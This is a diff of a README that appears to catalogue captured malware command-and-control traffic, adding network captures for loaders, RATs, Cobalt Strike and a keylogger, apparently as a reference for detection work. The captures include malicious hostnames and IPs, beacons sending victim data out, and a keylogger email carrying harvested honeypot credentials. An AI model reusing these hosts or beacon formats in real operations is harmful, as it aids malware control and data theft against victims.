@@ -63,6 +63,58 @@ Connection: close
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/arechclient2.png "Arechclient2")
 
+#### Artraloader
+~~~
+POST /kvs06v.php HTTP/1.0
+Host: onlinejohnline99.org
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-length: 97
+
+SNI=VTFS.QD&UME=Xjoepxt!8!Qspgfttjpobm&OPQ=benjo&IVR=VTFS.QD$$benjoAA11482.572.3314613.96675&st=0
+
+HTTP/1.0 200 OK
+Content-Type: text/html
+Content-Length: 0
+Date: Mon, 26 Aug 2019 21:33:28 GMT
+Server: LiteSpeed
+Connection: close
+
+POST /Engset.php HTTP/1.0
+Host: hewle.kielsoservice.net
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-length: 126
+
+BCDEF=EFTLUPQ.KHMMKME&MNOPQ=Xjoepxt!21!Qsp&GHIJ=benjo&UVWXYZ=EFTLUPQ.KHMMKME$$benjoAAcc:37f65.f4db.51ge.bf:1.3875452f88:3&st=0
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/artra.png "Artraloader")
+
+#### Avemaria, aka ave_maria, warzone rat
+~~~
+    00000000  09 12 3b 42 2d 33 a2 44  fc 01 86 73               ..;B-3.D ...s
+00000000  09 12 3b 42 f7 33 a2 44  fd 01 86 73 69 3d ae 12   ..;B.3.D ...si=..
+00000010  bb c6 19 fd 1a 3a f3 11  c9 ae da 3c 30 bc 38 81   .....:.. ...<0.8.
+00000020  fc 00 0f ca 4e fb 05 c6  de b7 3c 6f 4e 01 a2 87   ....N... ..<oN...
+00000030  82 f5 2f 8e ed 2a 1f 0e  b7 43 0c a0 34 5d bd 80   ../..*.. .C..4]..
+00000040  50 56 66 1a 11 af f5 c8  a3 16 b0 d4 38 12 fe 66   PVf..... ....8..f
+00000050  6b 84 c4 4b 58 f4 d3 ce  87 45 75 54 60 f0 d5 3e   k..KX... .EuT`..>
+00000060  f1 79 73 5d 9f 1c c4 8e  1a c5 16 20 71 5e 55 06   .ys].... ... q^U.
+00000070  21 7b 8d 35 de 00 25 5d  6f d7 f2 ca a3 ea ef 73   !{.5..%] o......s
+00000080  90 1f 6e 10 d3 b1 0a 56  17 71 3b 48 bd 5c d9 36   ..n....V .q;H.\.6
+00000090  7e b4 f1 76 46 b8 48 ca  45 1e cd 66 90 d5 67 6b   ~..vF.H. E..f..gk
+000000A0  aa b7 98 ed 9d df 7e 36  c0 78 87 6b 56 03 86 67   ......~6 .x.kV..g
+000000B0  1f ed bb 9e e6 78 aa d5  94 e3 0e e2 c0 5e c7 87   .....x.. .....^..
+000000C0  57 60 34 e4 06 ea 10 ae  6e 38 c3 ca af 01 e2 2c   W`4..... n8.....,
+000000D0  ea d4 26 f9 3a 05 83 f7  aa 59 db 01 f5 2b 40 1e   ..&.:... .Y...+@.
+000000E0  74 28 36 1f ac 03                                  t(6...
+    0000000C  09 12 3b 42 2d 33 a2 44  dc 01 86 73               ..;B-3.D ...s
+000000E6  09 12 3b 42 29 33 a2 44  eb 01 86 73 bc 8d c4 e7   ..;B)3.D ...s....
+    00000018  09 12 3b 42 5d d9 a2 44  e2 01 86 73 bc 8d c4 e7   ..;B]..D ...s....
+    00000028  ca 69 41 01 ab 12 30 ff  ae 64 2d 93 dc 65 53 9b   .iA...0. .d-..eS.
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/avemaria.png "Avemaria")
+
 #### Azorult
 POST retrieve metod, unique pattern with lot's of '/' and ')'
 ~~~
@@ -76,13 +128,35 @@ J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/azorult.png "Azorult")
 
+#### Bitter RAT (Patchwork)
+~~~
+GET /ourtyaz/qwe.php?TIe=%3a116%3ad48.2431.52b5.c69e.3c86b%3a961e3g*Vtfs.QD*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1
+Host: frameworksupport.net
+Connection: close
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 74
+Date: Sat, 12 Jan 2019 02:44:27 GMT
+Accept-Ranges: bytes
+Server: LiteSpeed
+Connection: close
+
+90059c37-1320-41a4-b58d-2b75a9850d2f 78.109.23.2 User-PC EXE: ##
+SIZE: ##
+
+AXE: ##
+SIZE: #45#SRE: ##
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bitter.png "Bitter RAT")
+
 #### Bladabindi aka nJrat
 ~~~
 147.ll1990MURFTUFZT19DNEJBMzY0Nw==1990USER-PC1990admin199018-03-2619901990Win 7 Professional SP1 x861990No1990N/A1990..1990UHJvZ3JhbSBNYW5hZ2VyAA==1990123.inf1990MURFTUFZTw0KMWRlbWF5by5kdWNrZG5zLm9yZzoxOTkwDQp2NC4wLjMwMzE5DQpSZWdTdmNzLmV4ZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ0KRmFsc2U=15.CAP199035199023926.CAP1990......JFIF.....`.`.....C...........		.
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/njrat.png "Bladabindi - nJrat")
 
-#### Blackrat
+#### Blackrat aka blackremote
 ~~~
 9.............................>Clientx, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null......ProClient.Data.....data.bytes.............102622021F20414A5644044411072A755821285E472B1826013113651A28101927225D5B1037185F69394B2911291A1A3F031C113F696C1442754978280A031673281879480C2843582C0B032E41737D7E5B5C7A0F7C0D7521
 ...............................>Clientx, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null......ProClient.Data.....data.bytes..........."1A3A0F03142D5055131F585605383F4051
@@ -95,6 +169,38 @@ BlackRAT.Data.....data.bytes............123C3803363F73570B0552
 BlackRAT.Data.....data.bytes.............16310D190E2C4918020E52	..........$...MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/blackrat.png "Blackrat")
+
+#### Cobaltstrike
+~~~
+GET /Mdt7 HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; NP06)
+Host: 198.199.89.56
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Wed, 16 Oct 2019 00:03:32 GMT
+Content-Type: application/octet-stream
+Content-Length: 213589
+
+.......
+w.z....=..........C.D.'.'Z.2....:1....R..1...1.......1.9.t...^.......3.Q.3.R.~...~..........6a..6a-L^.............................................`.....W...?...O...=...^...1...T...:.......:..._...U...U...U.v.......v......,9
+.W.E.3k..a....9..l.T..k...........J......;J.._.k...$......J....h...'..qD
+
+GET /push HTTP/1.1
+Accept: */*
+Cookie: TwJl1o2Nzk3+xmC39FsNTbyJPGHyNxllFZ8wZUwR831SYmTwrxoGydXQGF1ej89K1t0rTLgzjd95c8127hlZ6SQ4hx95YrYuRHooitXYGEAxtbKv53LJ6K+6r1y1OQU3n0+O93xxPiyx6RvPeKzlACbO4nEc5YKzh0vAfWJvlm0=
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)
+Host: 198.199.89.56
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Wed, 16 Oct 2019 00:05:35 GMT
+Content-Type: application/octet-stream
+Content-Length: 0
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobaltstrike.png "Cobaltstrike")
 
 #### Danabot
 Not real TLS traffic, flag on "24 01 00 00" pattern and 24 byte first packet 
@@ -147,6 +253,60 @@ HTTP/1.1
 Host: domalo.online
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dcrat.png "DCRat")
+
+#### Delf Loader
+~~~
+GET /gate.php?serial=MTc4NS02NDU5LTQ2NDktMjQ0NA== HTTP/1.1
+Content-Type: text/html
+User-Agent: License
+Host: ddhook.000webhostapp.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Mon, 07 Oct 2019 10:36:45 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Server: awex
+X-Xss-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Request-ID: db10cf7bfe6a5d2a490182a808ccb458
+
+11d091d035fb3bd27625c54c622a7e48
+
+
+GET /check.php?serial=MTc4NS02NDU5LTQ2NDktMjQ0NA== HTTP/1.1
+Content-Type: text/html
+User-Agent: License
+Host: ddhook.000webhostapp.com
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Mon, 07 Oct 2019 10:36:45 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Server: awex
+X-Xss-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Request-ID: 4f25a2a515ae727693adbe820cf36edd
+
+bff12793b8731a7f138e454a576ed1b5
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/delf.png "Delf Loader")
+
+#### Donotgroup
+~~~
+POST /ze/volad/uzi HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
+Host: skillsnew.top
+Content-Length: 1265
+Cache-Control: no-cache
+
+data=oowJkdfLibIHB1Y62ffb2Cf5imwjN2x/vp1AE/SF8E9/fX1cnZaC6Bg7jRETqi6iAsAVATepyhSETB+r2H2rYWEvvx/SmugiXvz27uz0yReYJAkt5CqsQ1ydb5UHNRcWeCnGPQpjtxUSdy2LbDj+BHjBdjchVAB23Cz4rjuoSeMKlJRQ9zvCOr97/MMALs/TboDUd+5fj/i2/APrZTfpizOy8v+poMBVcVMSRXHmpqpemivoTJEMmTx7y5tGBeY2YbMpVycCDNMyaJr7Xuh3Bng2MVZ5/OO2jvfqFXqwiMMZtiBEpRGjCKGYsUb/J2cyOMtemC3Sh71GkfSpI1sSV+1rKJzBILo6VHTGPK0Z12dxKVXEUCn4KTUTo/QVWTCnCyL7r+b0BIL+SVXjBOGtamQqja1Hq0Hrihoulr6qYy0jDKiyDa9n9BkSO3AJXsx5IkMf0qQvKzMW3iWvcRmILL1AXRCGgsxFCvAcDZ9GV5jM7E6rXEYQcYATyePeWJIMnNO6Tvyn/4qcywkEiKwt8Uoe6YCGaEwZjIsWfhFHTyJXj4KUY7nUuArbF1iz029U2QErLL5AiQUpHYeddGkjkvEPRnwahESDpYAwS6dVEKCn/n4CMJHEJqxHNRA2uSEewoCBYQb1lsKfdiMFZvD1kzKaxR7Oeluch5UFAGEhbJQMC6PsyVQ1nna6bn2S/0Bc4tKsMXfkr3YdfrPrXjUu4PlMRYPQYFUKTTpsFyAHXQ4a5jaiW9PmZOx1Iej9I0aFIiF8e1nVYgNXmMO3pYYbKxW0sn/MswbPNeNs3vQVFma15AM3y7eK8sPPizvYTsG6ld8rW0aUNqidEfpvck50hpUDKH0RdcfT9u+Kw5NZJ99ebBO8DMc1q4/8l9Tb887feKC1bvRVS2JYZKSyDaLJtC7VYZLjtczdqtu5Ayrh3q8kvWFxneIVI9jBuYi5YSkH+F7YQ/yuiDZwtGw6USUejEOuIpfa0PSIJQkDf01AqeKrXcNtKnmjv51Kmu1Go5u0v/zPgWDNG6w3DH0UhWrZxodJwLuKx6Qu66p3Vww/XJcQwVIK+86StKqMcCBH44nE11jRVZNi8L5Ru6WWvVqtktYlOJAJq9T/0Y3O7Onac3fDTThRSkme8mpvzCbkVhTW3jG9h+8aKt2H5rpgrb+4oSfCZQh+V+zDE54I2ODNytc79YOHTdrxYgEG3K2wS4udvyG6t66FA8RUJqmMc+ZPSGk9ZDH0hKpA5iWAr06IGlo=
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/donotgroup.png "Donotgroup")
 
 #### Dunihi
 ~~~
@@ -247,6 +407,39 @@ kyMjI5loUABYmLgimiKQCLDyklKqUpqSoqpjBAMjIw==
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/exilerat.png "Exilerat")
 
+#### Fin7 JS Backdoor
+~~~
+POST /pictures/delete?type=name HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/50.0
+Content-Length: 326
+Host: moviedvdpower.com
+
+lwirwavfynacqo=PKWFG%04S@XZ%16l%04%0E%00%02%00f%09%02%06%09%1EAC%04%0D%02%05%1FKVTK%5DG%0AX%08%07%0F%0D%00W%05%5B%5DQ%05%0D%0AV%0F%0B%5B%0B%03%0E%0FP%03%0B%01%06%0E%0C%5D%06V%1FLZZ%5C%05%02%05%09%08%03%07%1FMZS%04%0E%01%05%1FQW%0A%0C%0A%09%02%0D%02%03%07%03%0Cr%0Dx%7C%09%05%08gfD%5CJ%1Egz%1ECV%5E%5Dl%5E%5D%05%5DRN%26_%267983
+
+HTTP/1.1 200 OK
+Server: nginx/1.12.2
+Date: Tue, 15 Oct 2019 16:27:41 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 0
+Connection: keep-alive
+
+POST /new/new?type=name HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/50.0
+Content-Length: 306
+Host: moviedvdpower.com
+
+lwirwavfynacqo=PG_EG%08%5BCXV%1Eo%04%02%08%01%00j%01%01%06%05%16BC%08%05%01%05%13CUTGUD%0AT%00%04%0F%01%08T%05WUR%05%01%02U%0F%07S%08%03%02%07S%03%07%09%05%0E%00U%05V%13DYZP%0D%01%05%05%00%00%07%13EYS%08%06%02%05%13YT%0A%00%02%0A%02%01%0A%00%07%0F%04q%0Dtt%0A%05%04oeDPB%1Dgv%16@VRUo%5EQ%0D%5ERB%26_%267500
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/fin7jsbackdoor.png "Fin7 JS Backdoor")
+
 #### Flawedammyy
 ~~~
 = ..">h..K...t.......N<.
@@ -274,6 +467,23 @@ Sbh=A2oUV0jxRNQErH6gY3lxQtOCTuQwNTdWJ25sTcda3oav(0QcLnkBrePt5vgAKuqyhbAftuJA5G5D
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/formbook.png "Formbook")
 
+#### GET2Loader (TA505):
+~~~
+POST /2021 HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; CIBA; MS-RTC LM 8)
+Content-Length: 95
+Host: windows-sys-update.com
+
+&D=User-PC&U=admin&OS=6.1&PR=Dwm.exe%7CEXCEL.EXE%7CExplorer.EXE%7Ctaskhost.exe%7Cwindanr.exe%7CHTTP/1.1 404 Not Found
+Server: nginx/1.10.3
+Date: Wed, 09 Oct 2019 18:53:18 GMT
+Content-Length: 0
+Connection: keep-alive
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")
+
 #### Glupteba
 ~~~
 POST /bots/post-ia-data?uuid=de7cfeb2-8d6a-480d-9043-488b8a616d7b HTTP/1.1
@@ -287,6 +497,34 @@ Accept-Encoding: gzip
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-1.png "Glupteba")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-2.png "Glupteba")
+
+#### Godzilla Loader
+~~~
+GET /gate16.php?g=-994429369&k=7NLp9MrFuKWnfhYAmxKEcsWO2 HTTP/1.1
+Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Accept-Language: en-US
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: filesdb.ru
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sat, 01 Sep 2018 12:12:58 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Keep-Alive: timeout=60
+Set-Cookie: PHPSESSID=btq14ialn2bbefrsvedfspt9s4; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Encoding: gzip
+
+<div id="s">IKqglmKsWN8CSCWpwIItt6O/sFpxceFdZPucGXeeUi1CbtjgXllqiSnOcsojWNxNP8ySG4XsKU94bKJh2vFSAtqb+g939WslRHMzKsr2YaDwN51PG9a/CZ/BVaK3Idznf3tkNJAy9+6r6vj/9spjxPp1+pqK3DrdVr7uJG0xkSv8Ez7fmCPgc4YrHpSk2cMvODT9bbv1eNE4zjGd+N4t3Lhp/+k48QWtGIQ48A6Q9HzhWO1L4SpVawEVg/hbN+EJSCVhQCIljVpvrcyeY6w1yX9QT5TSZosQlbzog3mLceYYz1teNlHwhGToXVDb9ACyxlo/FrdlapR/R0jCx0F+OQ==</div>
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/godzilla.png "Godzilla Loader")
+
 
 #### Hancitor
 ~~~
@@ -328,22 +566,31 @@ ICAgICAgICAgOiBob25leUBwb3QuY29tDQpQYXNzd29yZCAgICAgICAgICA6IGhvbmV5
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hawkeye.png "Hawkeye")
 
-#### Houdini aka vjworm vjw0rm
-~~~
-POST /Vre HTTP/1.1
-Accept: */*
-Accept-Language: en-us
-User-Agent: Laposte_C4BA3647\PC\admin\Microsoft Windows 7 Professional \Not-found\\Yes\FALSE\
-Accept-Encoding: gzip, deflate
-Host: jihanenouhaila.ddns.net:7773
-Content-Length: 0
-Connection: Keep-Alive
-Cache-Control: no-cache
-~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/houdini.png "Houdini")
-
 #### Icedid
-URI is uually data2.php
+~~~
+GET /photo.png?id=0181B9BACBCF3080870000000000FF40000001 HTTP/1.1
+Connection: Keep-Alive
+Host: eurobable.com
+
+HTTP/1.1 200 OK
+Server: openresty
+Date: Wed, 16 Oct 2019 15:30:33 GMT
+Content-Type: application/octet-stream
+Content-Length: 605211
+Connection: keep-alive
+Last-Modified: Tue, 08 Oct 2019 11:43:19 GMT
+ETag: "5d9c7657-93c1b"
+Accept-Ranges: bytes
+
+.PNG
+.
+...
+IHDR..............N.T....sRGB.........gAMA......a....	pHYs..........o.d.	;.IDATOLrEV.....Le.D|...Rp.{..D...g`...a@.\8,E
+.~1Z..X.N...^G.....,f$.c.......ru.#O..'.~.
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedid-2.png "Icedid")
+
+URI for websocket is usually data2.php
 ~~~
 GET /data2.php?1C00C7CC98D464FE HTTP/1.1
 Host: memphase.com
@@ -357,7 +604,7 @@ Connection: upgrade
 Sec-WebSocket-Accept: Kfh9QIsMVZcl6xEPYxPHzW8SZ8w=
 Upgrade: websocket
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedid.png "Icedid")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedid.png "Icedid websocket")
 
 #### Imminent RAT
 ~~~
@@ -499,6 +746,37 @@ Connection: close
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lokibot.png "Lokibot")
 
+#### Metamorpho BR Banker
+~~~
+POST / HTTP/1.0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 249
+Host: 18.217.112.176
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: identity
+User-Agent: Mozilla/3.0 (compatible; Indy Library)
+
+spxndja=HERETEVFDEVFJERERFEERFFEXERFJFGFKER&kfcemfgj=CCO&gvtsavp=EFMFM&ixjpblda=HEDEEDOEGDODXCPDKDMDMDYEFDXEEDSCMEHFAFFCCDACMCTCSCMDCCXCQCSDUDLCMCMDOFFEXFDFAFKEYCCCKEFFFFAFLEVEUCCEDFLERFLEVFKCLCMCMEHFAFFEUFGFOFKCCDNEVEWEVFFEUEVFJCMCYCWDLCM&xhwen=YDL
+
+HTTP/1.1 200 OK
+Date: Fri, 19 Jul 2019 15:18:12 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Fri, 19 Jul 2019 15:18:12 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorpho.png "Metamorpho")
+
 #### MilkyBoy
 ~~~
 POST / HTTP/1.1
@@ -581,6 +859,61 @@ flag on "40 00 00 00 17" pattern:
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-40.png "Nanocore 40")
 
+flag on "50 00 00 00 82" pattern:
+~~~
+00000000  50 00 00 00 82 c8 36 7a 87 1b 91 70 6b 20 7f 17   P.....6z ...pk ..
+00000010  ea 86 3a e9 07 fc 40 ae 0f ac bc f5 f2 6d f3 98   ..:...@. .....m..
+00000020  71 7a 0b 19 4c 8e 58 bb 6c 69 5a 99 55 4a 72 c6   qz..L.X. liZ.UJr.
+00000030  92 ed 39 fe 74 2a 9d b4 09 ca 5a 4a 83 dc 99 16   ..9.t*.. ..ZJ....
+00000040  0a ea 28 ad ba f6 87 d0 b7 4d 45 78 6a 71 84 19   ..(..... .MExjq..
+00000050  34 cc c6 79                                        4..y
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-50.png "Nanocore 50")
+
+#### NetSupport RAT
+~~~
+POST http://179.43.159.246/fakeurl.htm HTTP/1.1
+User-Agent: NetSupport Manager/1.3
+Content-Type: application/x-www-form-urlencoded
+Content-Length:    22
+Host: 179.43.159.246
+Connection: Keep-Alive
+
+CMD=POLL
+INFO=1
+ACK=1
+HTTP/1.1 200 OK
+Server: NetSupport Gateway/1.6 (Windows NT)
+Content-Type: application/x-www-form-urlencoded
+Content-Length:    60
+Connection: Keep-Alive
+
+CMD=ENCD
+ES=1
+DATA=.g+$.{.. \....W...bb...).w}..o..X..xf...
+POST http://179.43.159.246/fakeurl.htm HTTP/1.1
+User-Agent: NetSupport Manager/1.3
+Content-Type: application/x-www-form-urlencoded
+Content-Length:   232
+Host: 179.43.159.246
+Connection: Keep-Alive
+
+CMD=ENCD
+ES=1
+DATA=u.2h.r..4.]..%y-.....=I...D3.W..i.7?....=@....F.f....&t.[..6ra..L.....?....>......5T.m.<..O....a.g.qwjW..I{~i...1......\.bH8Z&8.|gY@:......7. .\.(.K(...oC.x.m-.o.D.t....Lv...{.............=J.J...f.V=@.`t..i......
+POST http://179.43.159.246/fakeurl.htm HTTP/1.1
+User-Agent: NetSupport Manager/1.3
+Content-Type: application/x-www-form-urlencoded
+Content-Length:    77
+Host: 179.43.159.246
+Connection: Keep-Alive
+
+CMD=ENCD
+ES=1
+DATA=l3.<(T{.E.....V....k.9|||$(m..$C.M..=I0`!.....^.....?sq. 
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/netsupport.png "NetSupport RAT")
+
 #### Netwire
 flag on "41 00 00 00 99" pattern in initial packet
 ~~~
@@ -643,6 +976,49 @@ Machine name is SNI
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/orcus.png "Orcus RAT")
 
+#### Origin Keylogger
+~~~
+From: sp@globalfinancel.com
+To: new@globalfinancel.com
+Date: 17 Oct 2019 15:03:43 +0000
+Subject: admin/USER-PC Recovered Accounts
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: quoted-printable
+
+Time: 10/17/2019 15:03:33<br>UserName: admin<br>ComputerName: USE=
+R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
+el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 4095.61 MB<br>IP: 18=
+5.117.118.92=0A<hr>URL:      https://www.facebook.com/<br>=0D=0AU=
+sername: honey@pot.com<br>=0D=0APassword: honeypass356<br>=0D=0AA=
+pplication: Chrome<br>=0D=0A<hr>=0D=0AURL:      192.168.1.1<br>=0D=0A=
+Username: honey@pot.com<br>=0D=0APassword: honeypass356<br>=0D=0A=
+Application: Outlook<br>=0D=0A<hr>=0D=0A
+
+From: sp@globalfinancel.com
+To: new@globalfinancel.com
+Date: 17 Oct 2019 15:03:43 +0000
+Subject: admin/USER-PC Recovered Cookies
+Content-Type: multipart/mixed;
+ boundary=--boundary_0_33ca7fc1-78dd-4797-bb1b-819697f17244
+
+
+----boundary_0_33ca7fc1-78dd-4797-bb1b-819697f17244
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: quoted-printable
+
+Time: 10/17/2019 15:03:34<br>UserName: admin<br>ComputerName: USE=
+R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
+el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 4095.61 MB<br>IP: 18=
+5.117.118.92=0A<hr>
+----boundary_0_33ca7fc1-78dd-4797-bb1b-819697f17244
+Content-Type: application/octet-stream; name=4dz3xb0p.hda.zip
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment
+
+UEsDBBQAAAgIAIRp/k5nVtI5VAoAAABwAAAjAAAANGR6M3hiMHAuaGRhL0Nocm9tZS9E
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/origin.png "Origin Keylogger")
+
 #### Ostap
 ~~~
 POST /angola/mabutu.php?pi=29h&tan=cezar&z=662343339&n=0&u=20&an=9468863238 HTTP/1.1
@@ -698,6 +1074,35 @@ WmiPrvSE.exe*null
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-1.png "Ostap")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-2.png "Ostap")
 
+#### ParasiteHTTP Loader
+~~~
+POST /index.php HTTP/1.1
+Accept: */*
+Host: 80.233.134.242
+Content-Type: application/x-www-form-urlencoded
+Connection: Close
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+Content-Length: 280
+Cache-Control: no-cache
+
+BF6472F6DC3=Pi5tSiBItP-2ZyuFJlr31Jp58O0HzR74v0b4l2HaoHH537FeTxgg-msYkTvX6SSJ8FswUtoTg4O86o2HyWec2zuU6VFzTwgaFYw_28nFRIqcJv8TqrV7SYgFKSpbqY8aZhEcHY982M_flvAHMCjsD8-fxezzV5BSBDBbfYb5WZvBrsbJVlPwXYFmETrm7CrWF5LwvEFhu1Ecp14ymv1xPoCG0vfqAv5tsUn0H7mA5R5g7HAo2c3_r9fuZUtw9CKD46G2JnBF-A==
+
+HTTP/1.1 200 OK
+Date: Tue, 28 May 2019 08:46:26 GMT
+Server: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.37
+X-Powered-By: PHP/5.6.37
+Set-Cookie: PHPSESSID=s3l4jdfsc8nkjghcevlshn3d67; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 416
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+8jQG4riRhJFWMlJ9RTKeV7k45+I3REM8JjIIBZ2ttxzjDFxOX7VjxuypIrJn9cQ1ZMg6fvgWSSpto3sivUfvUCHWLzb2ljPhPugPTYb0KsgResnAIFl+aoqF5m9bCyBd6PMoRLdOdsuDW+E3wrb7ZNpApXlX2htDZRNhaqfST8eBE9Cvl7H0vyUzY+BfH5M4fvvt71DCRt2OP31tgu7aMMxM0mUWvBBZcNpeZzLRdMFd0Ea1u3oM+vLWrhFLYGuCWN6TPaqlEpw/9pgLUI8BhxUYFOJvyTRIFwXmlQPWMY6qg0/l+b5Ha+SYCnLtw8Uyqilil+OBM+KM5MT4C4l9vkXsv/ID9X8ZRr2l9cHzlW5J7sLVrGeH26KmBrjqBM3c4Ini4VTZZCr5KDrsRpi21NaheQLGLA==
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasitehttp.png "ParasiteHTTP Loader")
+
 #### Pony
 Follow tcp stream, not http stream in wireshark
 ~~~
@@ -729,6 +1134,91 @@ X-Powered-By: PHP/5.4.45
 .....f>k.X.......
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony.png "Pony")
+
+#### Pony Loader
+~~~
+POST /eng/gate.php HTTP/1.0
+Host: www.jicago-jp.com
+Accept: */*
+Accept-Encoding: identity, *;q=0
